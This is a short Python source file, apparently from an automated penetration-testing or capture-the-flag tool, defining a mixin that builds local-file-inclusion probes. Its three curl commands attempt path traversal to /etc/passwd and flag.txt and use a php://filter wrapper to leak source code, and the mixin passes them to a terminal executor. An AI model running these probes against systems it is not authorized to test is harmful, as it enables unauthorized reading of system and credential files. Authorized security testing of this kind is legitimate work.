"""File-read chains: local file inclusion and path traversal probes."""

from __future__ import annotations

from .base import _ChainOutcome


class LFIChainMixin:
    """Low-coupling LFI probes extracted from the dispatcher route table."""

    @staticmethod
    def _lfi_probe_commands(target: str) -> list[str]:
        return [
            f'curl -s "{target}?file=../../../etc/passwd"',
            f'curl -s "{target}?file=../../../flag.txt"',
            f'curl -s "{target}?file=php://filter/convert.base64-encode/resource=index.php"',
        ]

    async def _execute_lfi_chain(self, target: str) -> _ChainOutcome:
        return await self._execute_terminal_commands(target, self._lfi_probe_commands(target))
